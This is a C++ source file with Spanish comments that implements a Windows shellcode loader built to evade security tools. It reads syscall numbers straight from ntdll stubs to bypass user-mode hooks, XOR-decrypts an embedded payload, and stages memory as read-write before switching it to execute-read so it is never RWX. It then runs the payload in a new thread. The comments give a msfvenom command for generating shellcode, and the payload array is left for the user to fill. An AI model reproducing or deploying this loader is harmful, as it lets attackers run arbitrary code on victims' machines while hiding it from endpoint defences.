#include <windows.h>
#include <iostream>
#include <string>

// variable global para pasar el SSN al stub de NASM
// no se pasa como argumento porque desplazaria los argumentos reales de la syscall
WORD g_ssn = 0;

// declaraciones de las syscalls implementadas en syscall_stub.asm
extern "C" NTSTATUS NtAllocVirtualMem(
    HANDLE    ProcessHandle,
    PVOID*    BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

extern "C" NTSTATUS NtProtectVirtualMem(
    HANDLE  ProcessHandle,
    PVOID*  BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

extern "C" NTSTATUS NtWriteVirtualMem(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  BufferSize,
    PSIZE_T BytesWritten
);

extern "C" NTSTATUS NtCreateThreadEx(
    PHANDLE         ThreadHandle,
    ACCESS_MASK     DesiredAccess,
    PVOID           ObjectAttributes,
    HANDLE          ProcessHandle,
    PVOID           StartAddress,
    PVOID           Argument,
    ULONG           CreateFlags,
    SIZE_T          ZeroBits,
    SIZE_T          StackSize,
    SIZE_T          MaximumStackSize,
    PVOID           AttributeList
);

// leer el SSN de una funcion de NTDLL directamente desde memoria
WORD GetSyscallNumber(LPCSTR functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE   pFunc  = (PBYTE)GetProcAddress(hNtdll, functionName);

    if (!pFunc) return 0;

    // patron del stub sin hookear:
    // 4C 8B D1 → mov r10, rcx
    // B8 XX XX → mov eax, SSN
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B &&
        pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(WORD*)(pFunc + 4);
    }
    return 0;
}

// descifrado XOR con clave rotativa
void xorDecrypt(unsigned char* data, size_t size, const std::string& key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.size()];
    }
}

int main() {

    // shellcode cifrado con XOR reemplazar con el tuyo
    // generar: msfvenom -p windows/x64/exec CMD=calc.exe -f c
    // cifrar con la misma clave antes de pegar
    unsigned char shellcode[] = { /* bytes XOReados */ };
    const std::string key = "tu_clave_xor";
    SIZE_T shellcodeSize = sizeof(shellcode);
    SIZE_T writeSize     = shellcodeSize;   // guardar antes de que NtAlloc lo modifique

    // descifrar el shellcode en memoria
    xorDecrypt(shellcode, shellcodeSize, key);

    // 1. NtAllocateVirtualMemory alloca con PAGE_READWRITE sin ejecucion
    PVOID     baseAddr = NULL;
    ULONG_PTR zeroBits = 0;

    g_ssn = GetSyscallNumber("NtAllocateVirtualMemory");
    NTSTATUS status = NtAllocVirtualMem(
        GetCurrentProcess(), &baseAddr, zeroBits,
        &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (status != 0) return 1;
    std::cout << "[+] Memoria alocada: " << baseAddr << "\n";

    // 2. NtWriteVirtualMemory copiar shellcode al bloque alocado
    SIZE_T bytesWritten = 0;

    g_ssn = GetSyscallNumber("NtWriteVirtualMemory");
    status = NtWriteVirtualMem(
        GetCurrentProcess(), baseAddr, shellcode, writeSize, &bytesWritten
    );
    if (status != 0) return 1;
    std::cout << "[+] Shellcode copiado: " << std::dec << bytesWritten << " bytes\n";

    // 3. NtProtectVirtualMemory cambiar a PAGE_EXECUTE_READ
    // la memoria nunca fue RWX simultaneamente
    ULONG oldProtect = 0;

    g_ssn = GetSyscallNumber("NtProtectVirtualMemory");
    status = NtProtectVirtualMem(
        GetCurrentProcess(), &baseAddr, &writeSize, PAGE_EXECUTE_READ, &oldProtect
    );
    if (status != 0) return 1;
    std::cout << "[+] Permisos cambiados a PAGE_EXECUTE_READ\n";

    // 4. NtCreateThreadEx crear hilo que ejecuta el shellcode
    HANDLE hThread = NULL;

    g_ssn = GetSyscallNumber("NtCreateThreadEx");
    status = NtCreateThreadEx(
        &hThread, GENERIC_ALL, NULL, GetCurrentProcess(),
        baseAddr, NULL, 0, 0, 0, 0, NULL
    );
    if (status != 0) return 1;
    std::cout << "[+] Hilo creado. Ejecutando shellcode\n";

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    return 0;
}